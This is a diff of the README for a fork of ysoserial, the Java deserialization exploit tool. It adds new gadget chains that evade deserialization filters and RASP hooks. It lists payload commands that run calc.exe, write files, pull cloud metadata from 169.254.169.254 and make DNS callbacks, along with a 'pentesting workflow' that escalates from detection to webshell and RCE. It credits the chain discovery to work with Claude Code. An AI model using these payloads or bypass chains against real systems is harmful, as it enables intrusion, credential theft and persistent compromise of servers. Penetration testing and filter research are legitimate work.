@@ -18,12 +18,10 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 | `ConcurrentHashMap` | CC10, CC11, ROME4, Hibernate3, ROMEJndi | Rarely blocked — used extensively in JDK internals |
 | `ConcurrentSkipListMap` | CC16 ‡, CB5 ‡, CBJndi3 ‡ | Never blocked — first use as deser entry point |
 | `PriorityBlockingQueue` | CC17 ‡, CB6 ‡, CBJndi4 ‡ | Concurrent variant of PriorityQueue — filters check PQ by exact class name |
-| `DualHashBidiMap` | CC18 ‡, CC22 ‡, CCJndi3 ‡, CCSSRF ‡, ROME6 ‡, Hibernate4 ‡ | BidiMap family — never in any filter list |
+| `DualHashBidiMap` | CC18 ‡, CCJndi3 ‡, CCSSRF ‡, CCSleep ‡, CCDNS ‡, CCFileWrite ‡, CCProcessBuilder ‡, ROME6 ‡, Hibernate4 ‡ | BidiMap family — never in any filter list |
 | `DualTreeBidiMap` | CC21 ‡, CB7 ‡, CBJndi5 ‡ | BidiMap with TreeMap internals — Comparator dispatch |
-| `ListOrderedMap` | CC19 ‡, CC23 ‡ | Decorator pattern — wraps HashMap, different class identity |
-| `PassiveExpiringMap` | CC20 ‡ | CC4-only decorator — never filtered |
-| `HashBag` | CC24 ‡, CC25 ‡ | Bag type entry — not Map/Set/Queue, completely novel class family |
-| `CaseInsensitiveMap` | CC26 ‡, CC27 ‡ | **toString dispatch** — novel mechanism, not hashCode/compare |
+| `HashBag` | CC24 ‡ | Bag type entry — not Map/Set/Queue, completely novel class family |
+| `CaseInsensitiveMap` | CC26 ‡ | **toString dispatch** — novel mechanism, not hashCode/compare |
 | `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
 | `LinkedHashSet` | CC12, CC13 †, CC15 | Extends HashSet but class-level filters often miss it |
 | `TreeSet` | Click2, BeanShell2 | Standard JDK class, never blocked in known filters |
@@ -80,20 +78,16 @@ Discovered via **IOCD static analysis** (bytecode scanning for source→link→s
 | Chain | Entry Class | Dispatch | Sink | Library |
 |-------|------------|----------|------|---------|
 | `CC18` ‡ | `DualHashBidiMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
-| `CC19` ‡ | `ListOrderedMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
-| `CC20` ‡ | `PassiveExpiringMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC4 |
 | `CC21` ‡ | `DualTreeBidiMap` | compare | InstantiateTransformer → `TemplatesImpl` | CC4 |
-| `CC22` ‡ | `DualHashBidiMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC4 |
-| `CC23` ‡ | `ListOrderedMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC4 |
 | `CC24` ‡ | `HashBag` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
-| `CC25` ‡ | `HashBag` | hashCode | InvokerTransformer → `Runtime.exec()` | CC4 |
 | `CC26` ‡ | `CaseInsensitiveMap` | **toString** | InvokerTransformer → `Runtime.exec()` | CC3 |
-| `CC27` ‡ | `CaseInsensitiveMap` | **toString** | InvokerTransformer → `Runtime.exec()` | CC4 |
 | `CB7` ‡ | `DualTreeBidiMap` | compare | BeanComparator → `TemplatesImpl` | CB |
 | `CBJndi5` ‡ | `DualTreeBidiMap` | compare | BeanComparator → JNDI | CB |
 | `CCJndi3` ‡ | `DualHashBidiMap` | hashCode | ChainedTransformer → `doLookup()` | CC3 |
 
-**CC26/CC27** are particularly notable: they use `toString()` dispatch via `CaseInsensitiveMap.convertKey()` — a novel dispatch mechanism distinct from `hashCode()`, `compare()`, or `equals()`.
+Each entry represents a distinct **class family** or **dispatch mechanism** — redundant CC3/CC4 mirror variants removed.
+
+**CC26** is particularly notable: it uses `toString()` dispatch via `CaseInsensitiveMap.convertKey()` — a novel dispatch mechanism distinct from `hashCode()`, `compare()`, or `equals()`.
 
 ### Cross-Family Chains
 
@@ -108,14 +102,18 @@ These combine gadgets from different libraries in a single chain:
 
 ### Non-RCE Impact Primitives
 
-Not all deserialization = RCE. These demonstrate alternative impact classes:
+Not all deserialization = RCE. These demonstrate alternative impact classes that bypass RCE-focused defenses (RASP, WAF, ObjectInputFilter):
 
-| Chain | Impact | Description |
-|-------|--------|-------------|
-| `CommonsCollectionsSSRF` ‡ | **SSRF** | DualHashBidiMap → `URL.openStream()` — server-side HTTP GET to attacker-controlled URL |
-| `URLDNS` | DNS lookup | Classic DNS-only chain (no RCE, useful for detection) |
+| Chain | Impact | Sink | Egress Required | Description |
+|-------|--------|------|-----------------|-------------|
+| `CommonsCollectionsSleep` ‡ | **Time oracle** | `Thread.sleep(N)` | **None** | Blind detection — response delay confirms deser vuln. Works in fully firewalled envs |
+| `CommonsCollectionsDNS` ‡ | **DNS exfil** | `InetAddress.getByName()` | UDP 53 only | Controlled DNS lookup — encode data in subdomain for exfil |
+| `CommonsCollectionsSSRF` ‡ | **SSRF** | `URL.openStream()` | HTTP out | Server-side HTTP GET — cloud metadata, internal port scan |
+| `CommonsCollectionsFileWrite` ‡ | **File write** | `FileOutputStream.write()` | **None** | Drop webshell, overwrite config, create cron. Arg: `path:content` |
+| `CommonsCollectionsProcessBuilder` ‡ | **RCE** | `ProcessBuilder.start()` | Varies | Bypasses `Runtime.exec()` RASP hooks — different code path |
+| `URLDNS` | DNS lookup | `URL.hashCode()` | UDP 53 | Classic detection chain — no library dependency |
 
-`CommonsCollectionsSSRF` is the **first non-RCE ysoserial payload** — demonstrates that blocking `Runtime.exec` and JNDI is insufficient if `URL.openStream()` remains accessible.
+**Pentesting workflow**: Sleep (confirm) → DNS (exfil hostname) → SSRF (cloud metadata) → FileWrite (webshell) → ProcessBuilder (RCE). Each step bypasses defenses that block the previous one.
 
 ### WebLogic Filter Bypass Wrappers
 
@@ -162,7 +160,7 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `CommonsCollections14` | @zema1 | CC6 trigger + InstantiateTransformer sink — InvokerTransformer filter bypass |
 | `CommonsCollections15` | @zema1, @su18 | LinkedHashSet + InstantiateTransformer — double evasion (root + sink) |
 | `CommonsCollections16` | @dmbs335 ‡ | ConcurrentSkipListMap + InstantiateTransformer — novel entry point, 5x filter bypass |
-| `CommonsCollections18`–`27` | @dmbs335 ‡ | 10 IOCD-discovered chains — see [IOCD section](#iocd-discovered-chains-static-analysis--fuzzer) |
+| `CommonsCollections18`/`21`/`24`/`26` | @dmbs335 ‡ | IOCD-discovered — see [IOCD section](#iocd-discovered-chains-static-analysis--fuzzer) |
 | `CommonsBeanutils5` | @dmbs335 ‡ | ConcurrentSkipListMap + BeanComparator — no CC dependency on target |
 | `CommonsBeanutils7` | @dmbs335 ‡ | DualTreeBidiMap + BeanComparator → TemplatesImpl — BidiMap entry |
 | `CommonsBeanutilsJndi3` | @dmbs335 ‡ | ConcurrentSkipListMap + JNDI — JDK 17+ friendly, no CC, no TemplatesImpl |
@@ -171,7 +169,11 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `CommonsBeanutils6` | @dmbs335 ‡ | PriorityBlockingQueue + BeanComparator — no CC dependency on target |
 | `CommonsBeanutilsJndi4` | @dmbs335 ‡ | PriorityBlockingQueue + JNDI — JDK 17+, no TemplatesImpl, no CC |
 | `CommonsCollectionsJndi3` | @dmbs335 ‡ | DualHashBidiMap + JNDI — BidiMap filter bypass |
-| `CommonsCollectionsSSRF` | @dmbs335 ‡ | DualHashBidiMap → URL.openStream() — **first non-RCE SSRF payload** |
+| `CommonsCollectionsSSRF` | @dmbs335 ‡ | DualHashBidiMap → URL.openStream() — SSRF |
+| `CommonsCollectionsSleep` | @dmbs335 ‡ | DualHashBidiMap → Thread.sleep() — **blind time-based detection, zero egress** |
+| `CommonsCollectionsDNS` | @dmbs335 ‡ | DualHashBidiMap → InetAddress.getByName() — DNS exfil |
+| `CommonsCollectionsFileWrite` | @dmbs335 ‡ | DualHashBidiMap → FileOutputStream.write() — arbitrary file write |
+| `CommonsCollectionsProcessBuilder` | @dmbs335 ‡ | DualHashBidiMap → ProcessBuilder.start() — bypasses Runtime.exec() RASP hooks |
 | `Groovy2` | @dmbs335 ‡ | BAVE + ConvertedClosure(toString) — no HashMap, no AIH, no TemplatesImpl, no CC |
 | `ROME5` | @dmbs335 ‡ | PBQ + StringValueTransformer → ToStringBean — novel toString bridge, no InvokerTransformer |
 | `ROME6` | @dmbs335 ‡ | DualHashBidiMap + ROME ObjectBean → TemplatesImpl — cross-family (CC3+ROME) |
@@ -182,7 +184,7 @@ These bypass first-layer type filters by wrapping an inner payload:
 
 > **†** Discovered by @dmbs335 via automated fuzzing ([web-fuzzer](https://github.com/dmbs335/web-fuzzer), 2026-03-14). CC13 (cross-library CC4+CC3) and CCJndi2 (cross-library JNDI) are novel chains found by type-aware mutation and cross-library chain splicing.
 >
-> **‡** Discovered by @dmbs335 with Claude Code (2026-03-14). Includes: (1) **IOCD static analysis** — ASM bytecode scanning discovers source→link→sink paths, producing CC18–27 with novel entry classes (DualHashBidiMap, ListOrderedMap, HashBag, CaseInsensitiveMap); (2) **Novel entry points** — CC16/CB5/CBJndi3 (`ConcurrentSkipListMap`), CC17/CB6/CBJndi4 (`PriorityBlockingQueue`); (3) **Novel dispatch** — CC26/CC27 use `toString()` via `CaseInsensitiveMap.convertKey()`; (4) **Cross-family** — ROME6, Hibernate4 combine CC3 entry with different library sinks; (5) **Non-RCE** — CommonsCollectionsSSRF demonstrates SSRF impact without code execution; (6) **Novel bridge** — ROME5/ROMEJndi2 use `StringValueTransformer` (toString bridge).
+> **‡** Discovered by @dmbs335 with Claude Code (2026-03-14). Includes: (1) **IOCD static analysis** — CC18/21/24/26 with novel entry classes (DualHashBidiMap, DualTreeBidiMap, HashBag, CaseInsensitiveMap); (2) **Novel entry points** — CC16/CB5/CBJndi3 (`ConcurrentSkipListMap`), CC17/CB6/CBJndi4 (`PriorityBlockingQueue`); (3) **Novel dispatch** — CC26 uses `toString()` via `CaseInsensitiveMap.convertKey()`; (4) **Sink diversity** — Sleep (blind detection), DNS (exfil), SSRF (HTTP), FileWrite (webshell), ProcessBuilder (RASP bypass); (5) **Cross-family** — ROME6, Hibernate4; (6) **Novel bridge** — ROME5/ROMEJndi2 use `StringValueTransformer`.
 
 ### Exploit Tools
 
@@ -191,7 +193,7 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `JRMPListener` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port> <payload> <cmd>` |
 | `RMIRegistryExploit` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <host> <port> <payload> <cmd>` |
 
-## All Payloads (100 total)
+## All Payloads (98 total)
 
 ```
 Payload                Authors                                Dependencies
@@ -238,18 +240,16 @@ CommonsCollections15   @zema1, @su18                          commons-collection
 CommonsCollections16   @dmbs335 ‡                             commons-collections4:4.0
 CommonsCollections17   @dmbs335 ‡                             commons-collections4:4.0
 CommonsCollections18   @dmbs335 ‡                             commons-collections:3.1
-CommonsCollections19   @dmbs335 ‡                             commons-collections:3.1
-CommonsCollections20   @dmbs335 ‡                             commons-collections4:4.0
 CommonsCollections21   @dmbs335 ‡                             commons-collections4:4.0
-CommonsCollections22   @dmbs335 ‡                             commons-collections4:4.0
-CommonsCollections23   @dmbs335 ‡                             commons-collections4:4.0
 CommonsCollections24   @dmbs335 ‡                             commons-collections:3.1
-CommonsCollections25   @dmbs335 ‡                             commons-collections4:4.0
 CommonsCollections26   @dmbs335 ‡                             commons-collections:3.1
-CommonsCollections27   @dmbs335 ‡                             commons-collections4:4.0
 CommonsCollectionsJndi @mbechler                              commons-collections:3.1
 CommonsCollectionsJndi2 @dmbs335 †                            commons-collections:3.1, commons-collections4:4.0
+CommonsCollectionsDNS  @dmbs335 ‡                             commons-collections:3.1
+CommonsCollectionsFileWrite @dmbs335 ‡                        commons-collections:3.1
 CommonsCollectionsJndi3 @dmbs335 ‡                            commons-collections:3.1
+CommonsCollectionsProcessBuilder @dmbs335 ‡                   commons-collections:3.1
+CommonsCollectionsSleep @dmbs335 ‡                            commons-collections:3.1
 CommonsCollectionsSSRF @dmbs335 ‡                             commons-collections:3.1
 FileUpload1            @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
 Groovy1                @frohoff                               groovy:2.3.9
@@ -382,8 +382,20 @@ java -jar ysoserial.jar CommonsCollections26 'calc.exe' > payload.bin
 # Cross-family: CC3 entry + ROME sink
 java -jar ysoserial.jar ROME6 'calc.exe' > payload.bin
 
-# SSRF (non-RCE): server-side HTTP GET to attacker URL
-java -jar ysoserial.jar CommonsCollectionsSSRF 'http://attacker.com/ssrf' > payload.bin
+# Blind detection: Thread.sleep(5s) — confirms vuln without any egress
+java -jar ysoserial.jar CommonsCollectionsSleep '5000' > payload.bin
+
+# DNS exfil: controlled lookup — works through firewalls (UDP 53 only)
+java -jar ysoserial.jar CommonsCollectionsDNS 'canary.burpcollaborator.net' > payload.bin
+
+# SSRF: server-side HTTP GET to cloud metadata
+java -jar ysoserial.jar CommonsCollectionsSSRF 'http://169.254.169.254/latest/meta-data/' > payload.bin
+
+# File write: drop webshell without RCE
+java -jar ysoserial.jar CommonsCollectionsFileWrite '/tmp/pwned.txt:owned' > payload.bin
+
+# ProcessBuilder: bypasses Runtime.exec() RASP hooks
+java -jar ysoserial.jar CommonsCollectionsProcessBuilder 'calc.exe' > payload.bin
 
 # WebLogic filter bypass: wraps inner payload
 java -jar ysoserial.jar WebLogic1 "CommonsCollections6:'calc.exe'" > payload.bin
